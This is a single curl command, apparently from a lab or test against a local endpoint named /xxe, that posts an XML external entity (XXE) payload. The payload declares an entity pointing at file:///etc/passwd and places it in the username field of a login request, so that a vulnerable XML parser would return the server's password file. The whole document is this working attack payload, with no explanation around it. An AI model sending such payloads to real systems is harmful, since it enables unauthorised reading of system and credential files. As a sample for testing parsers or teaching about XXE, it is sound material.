curl -v -H "Content-Type: text/plain" POST http://localhost:8080/xxe -d '<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE login [  
<!ELEMENT login ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<login><username>&xxe;</username><password>password</password></login>
'
